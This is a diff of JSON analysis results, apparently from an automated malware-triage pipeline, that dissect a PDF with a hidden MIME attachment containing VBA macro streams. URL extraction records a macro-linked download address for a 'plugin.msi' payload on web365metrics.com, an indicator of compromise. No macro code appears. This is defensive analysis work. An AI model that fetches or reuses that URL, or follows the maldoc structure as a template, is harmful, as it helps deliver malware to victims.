@@ -33,6 +33,503 @@
       },
       "tags": {}
     },
+    "file:09ddbe6d159c1fae7299f5d4e1281dad6068331d9f651f45a51265277b80f0ed": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1.extracted/theme/theme/themeManager.xml": {}
+      },
+      "redirection": "file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d",
+      "relationships": {
+        "extracted_from file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text, with CRLF line terminators (text/xml)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "xml_plain_text_analyzer": {
+          "details": {
+            "xml_plain_text": null
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:0aea9b76b24f4cce73e838afd51f718581835a531105d19188d270d37cd06f25": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true,
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime.officeparser/ThisDocument.cls": {
+          "type=script.macro": true
+        }
+      },
+      "redirection": "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06",
+      "relationships": {
+        "extracted_from file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {
+        "extracted_ole_analyzer": {
+          "details": {
+            "suspect_files": []
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: ASCII text, with CRLF line terminators (text/plain)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [
+              "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi"
+            ],
+            "urls_grouped_by_domain": {
+              "web365metrics.com": [
+                "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi"
+              ]
+            }
+          },
+          "summary": "URL Extraction Analysis (web365metrics.com)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:0bea86356ad057bdaa7a53e13e47c264ca5e923fb6f7048e46a7a3860742e64f": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-13": {}
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_hash_analyzer": {
+          "details": {
+            "md5": "787ce2e28b0066455283cbf27e698bd0",
+            "sha1": "be9c26b25ad50f20645a70c9ca3982b887c736b8",
+            "sha256": "0bea86356ad057bdaa7a53e13e47c264ca5e923fb6f7048e46a7a3860742e64f"
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: ASCII text, with CRLF line terminators (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:1908ce99e39b3abbed4819b32799023735ba6320a72e9eb1af49e303d2988b7d": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-7": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/png",
+            "type": "PNG image data, 24 x 24, 8-bit/color RGBA, non-interlaced"
+          },
+          "summary": "File Type Analysis: PNG image data, 24 x 24, 8-bit/color RGBA, non-interlaced (image/png)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:2983db3781942d11b9497551888ee8774f861ff9cbc5c64ddb79eaa0698f87bd": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1.extracted/theme/theme/_rels/themeManager.xml.rels": {}
+      },
+      "redirection": "file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d",
+      "relationships": {
+        "extracted_from file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text, with CRLF line terminators (text/xml)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "xml_plain_text_analyzer": {
+          "details": {
+            "xml_plain_text": null
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:315108b38d5662aa4e9455ecd1b481a15acb292390dc86faf39e03c5e096056f": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-10": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/png",
+            "type": "PNG image data, 1688 x 3, 8-bit/color RGBA, non-interlaced"
+          },
+          "summary": "File Type Analysis: PNG image data, 1688 x 3, 8-bit/color RGBA, non-interlaced (image/png)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:35009a07fd35e0fa19df9bbdac4649c88a1c8c7090da1fc9e712bb57e15f118d": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:3f538c5957ff1a38e0f609f5eea01d01855e3a29890dfa7c714c30ab8adaa082": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime.officeparser/stream_4_0.dat": {}
+      },
+      "redirection": "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06",
+      "relationships": {
+        "extracted_from file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {
+        "extracted_ole_analyzer": {
+          "details": {
+            "suspect_files": []
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:40e4e77b31bb3aa16458f2f0adbcbd8cc3308e7a2b1285733602b53f15675164": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-8": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/png",
+            "type": "PNG image data, 24 x 24, 8-bit/color RGBA, non-interlaced"
+          },
+          "summary": "File Type Analysis: PNG image data, 24 x 24, 8-bit/color RGBA, non-interlaced (image/png)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:580e14734c48fd7239b88bdaf8546866c401d9580b05b82e7efc3906c7d1f248": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-6": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/png",
+            "type": "PNG image data, 32 x 32, 8-bit/color RGBA, non-interlaced"
+          },
+          "summary": "File Type Analysis: PNG image data, 32 x 32, 8-bit/color RGBA, non-interlaced (image/png)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:5814bcf32598ccca48bbdce433702c6072a353225ed32939d5a52c6eae5838cc": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {
+        "pdf_analyzer": true
+      },
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.gs.pdf": {
+          "type=document.pdf": true,
+          "type=document.pdf.rendered": true
+        }
+      },
+      "redirection": "file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d",
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_hash_analyzer": {
+          "details": {
+            "md5": "f2d5c297d22706dfac670960ff730348",
+            "sha1": "466bc0ba20d53f35ee20cc3443071d7dfa4b6fd0",
+            "sha256": "5814bcf32598ccca48bbdce433702c6072a353225ed32939d5a52c6eae5838cc"
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": true,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/pdf",
+            "type": "PDF document, version 1.7, 1 page(s)"
+          },
+          "summary": "File Type Analysis: PDF document, version 1.7, 1 page(s) (application/pdf) (pdf document)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {
+        "pdf": true
+      }
+    },
     "file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": {
       "detections": {},
       "directives": {},
@@ -73,6 +570,28 @@
           "summary": "File Type Analysis: PDF document, version 1.7, 1 page(s) (zip deflate encoded) (application/pdf) (pdf document)",
           "tags": {}
         },
+        "hidden_mime": {
+          "details": {
+            "extracted_files": [
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-0",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-2",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-3",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-4",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-5",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-6",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-7",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-8",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-9",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-10",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-11",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12",
+              "<root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-13"
+            ]
+          },
+          "summary": "Hidden MIME Analysis: extracted <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-0, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-2, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-3, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-4, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-5, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-6, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-7, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-8, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-9, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-10, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-11, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12, <root>/files/718148a5712c1fec7b50acc89eee2aa0.mime/extracted-13",
+          "tags": {}
+        },
         "pdf_analyzer": {
           "details": {},
           "summary": null,
@@ -83,30 +602,125 @@
         "pdf": true
       }
     },
-    "file:9868f7636b573d58d1463542d9e7b63513d898623a32dfc142818bc39c89cce1": {
+    "file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": {
       "detections": {},
-      "directives": {
-        "extract_urls": true
-      },
-      "excluded_analysis": {
-        "pdf_analyzer": true
-      },
+      "directives": {},
+      "excluded_analysis": {},
       "paths": {
-        "718148a5712c1fec7b50acc89eee2aa0.gs.pdf": {
-          "type=document.pdf": true,
-          "type=document.pdf.rendered": true
-        }
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1": {}
       },
-      "redirection": "file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d",
       "relationships": {
         "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
       },
       "results": {
+        "archive": {
+          "details": {
+            "extracted_files": [
+              "[Content_Types].xml",
+              "theme/theme/theme1.xml",
+              "theme/theme/themeManager.xml",
+              "theme/theme/_rels/themeManager.xml.rels",
+              "_rels/.rels"
+            ],
+            "extraction_error": null,
+            "file_count": 5
+          },
+          "summary": "Archive Analysis: extracted 5 of 5 files: ([Content_Types].xml, theme/theme/theme1.xml, theme/theme/themeManager.xml, theme/theme/_rels/themeManager.xml.rels, _rels/.rels)",
+          "tags": {}
+        },
         "file_hash_analyzer": {
           "details": {
-            "md5": "c8965ce04deeddbf5d2cd8ee4f3e67ef",
-            "sha1": "c257018b977053af83366c2b62d629ac27ad2814",
-            "sha256": "9868f7636b573d58d1463542d9e7b63513d898623a32dfc142818bc39c89cce1"
+            "md5": "53c6716ac9eb1dd1bb3309ff2bd91696",
+            "sha1": "571c7d93c3394908e03ae93ad2098b9225a011a9",
+            "sha256": "65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d"
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": true,
+            "mime": "application/octet-stream",
+            "type": "Microsoft OOXML"
+          },
+          "summary": "File Type Analysis: Microsoft OOXML (application/octet-stream) (ms office document) (zip archive)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {},
+            "macros": [],
+            "type": "OpenXML"
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "zip": true
+      }
+    },
+    "file:65f3cdbc4390c81b94fa960b7362917443fc1e6a51e3f81e4cb4c4dfa09da4be": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-2": {}
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text, with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text, with CRLF line terminators (text/xml)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:67c441cecbccd993824d4f54590bd8260d11d8f89eadff94d9a2c6a80ab6e2b1": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime.officeparser/stream_3_0.dat": {}
+      },
+      "redirection": "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06",
+      "relationships": {
+        "extracted_from file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06": true
+      },
+      "results": {
+        "extracted_ole_analyzer": {
+          "details": {
+            "suspect_files": []
           },
           "summary": null,
           "tags": {}
@@ -119,15 +733,316 @@
             "is_office_document": false,
             "is_office_ext": false,
             "is_ole_file": false,
-            "is_pdf_file": true,
+            "is_pdf_file": false,
             "is_pe_file": false,
             "is_rtf_file": false,
             "is_x509": false,
             "is_zip_file": false,
-            "mime": "application/pdf",
-            "type": "PDF document, version 1.7, 1 page(s)"
+            "mime": "application/octet-stream",
+            "type": "data"
           },
-          "summary": "File Type Analysis: PDF document, version 1.7, 1 page(s) (application/pdf) (pdf document)",
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [
+              "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi'",
+              "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi"
+            ],
+            "urls_grouped_by_domain": {
+              "web365metrics.com": [
+                "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi'",
+                "https://web365metrics.com/files/69fbd341bcf4f734fd47f72710021ae6839/plugin.msi"
+              ]
+            }
+          },
+          "summary": "URL Extraction Analysis (web365metrics.com)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:6c98d4f2b62b4db730884f9bd6d27e5360693eaad02d9cdbaa0e71c4c747450b": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1.extracted/[Content_Types].xml": {}
+      },
+      "redirection": "file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d",
+      "relationships": {
+        "extracted_from file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, ASCII text, with very long lines (483), with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, ASCII text, with very long lines (483), with CRLF line terminators (text/xml)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "xml_plain_text_analyzer": {
+          "details": {
+            "xml_plain_text": null
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:70a70d84494772c1855ec6c2f9a16e0fc6cc41bdb0ce3743563ed943b63e07b8": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-1.extracted/theme/theme/theme1.xml": {}
+      },
+      "redirection": "file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d",
+      "relationships": {
+        "extracted_from file:65a1e83a2c052e128fa1e4bc2d0365b8bb2533945c14a10ae532aec371134a3d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/xml",
+            "type": "XML 1.0 document, Unicode text, UTF-8 text, with very long lines (8280), with CRLF line terminators"
+          },
+          "summary": "File Type Analysis: XML 1.0 document, Unicode text, UTF-8 text, with very long lines (8280), with CRLF line terminators (text/xml)",
+          "tags": {}
+        },
+        "url_extraction": {
+          "details": {
+            "urls": [],
+            "urls_grouped_by_domain": {}
+          },
+          "summary": null,
+          "tags": {}
+        },
+        "xml_plain_text_analyzer": {
+          "details": {
+            "xml_plain_text": null
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:8044bfe6b5223c069e8632f91993c4ea082b30fb4c6371c00166199903bad833": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-5": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/png",
+            "type": "PNG image data, 33 x 33, 8-bit/color RGBA, non-interlaced"
+          },
+          "summary": "File Type Analysis: PNG image data, 33 x 33, 8-bit/color RGBA, non-interlaced (image/png)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:85a1fb1026ae078efcb88f77e064ef874a4ef074d84f5d00232bab4ab60e75a8": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-4": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/jpeg",
+            "type": "JPEG image data, JFIF standard 1.01, resolution (DPI), density 120x120, segment length 16, baseline, precision 8, 211x124, components 3"
+          },
+          "summary": "File Type Analysis: JPEG image data, JFIF standard 1.01, resolution (DPI), density 120x120, segment length 16, baseline, precision 8, 211x124, components 3 (image/jpeg)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:8cd579f33b6bee18e2af4651192e21f802cc740eed38af9053ec690dcabf8efd": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-11": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/png",
+            "type": "PNG image data, 1688 x 3, 8-bit/color RGBA, non-interlaced"
+          },
+          "summary": "File Type Analysis: PNG image data, 1688 x 3, 8-bit/color RGBA, non-interlaced (image/png)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:be8d780401ec0b5ae04d6b5a00d8d5998e0d3bd6598d03e645427c7feb288eaf": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-3": {
+          "type=image": true
+        }
+      },
+      "relationships": {
+        "extracted_from file:5b677d297fb862c2d223973697479ee53a91d03073b14556f421b3d74f136b9d": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "image/jpeg",
+            "type": "JPEG image data, JFIF standard 1.01, resolution (DPI), density 120x120, segment length 16, baseline, precision 8, 211x124, components 3"
+          },
+          "summary": "File Type Analysis: JPEG image data, JFIF standard 1.01, resolution (DPI), density 120x120, segment length 16, baseline, precision 8, 211x124, components 3 (image/jpeg)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:ce49436dec0282ca0c2acb2966441b42d2620cd614f363ac0b43420dfdd687ed": {
+      "detections": {},
+      "directives": {
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "718148a5712c1fec7b50acc89eee2aa0.mime/extracted-12.activemime.officeparser/stream_6_0.dat": {}
+      },
+      "redirection": "file:d82f411152bcc9fdb41523528e5139cf3367650871462debbc17f2ac654d0b06",
+      "relationships": {
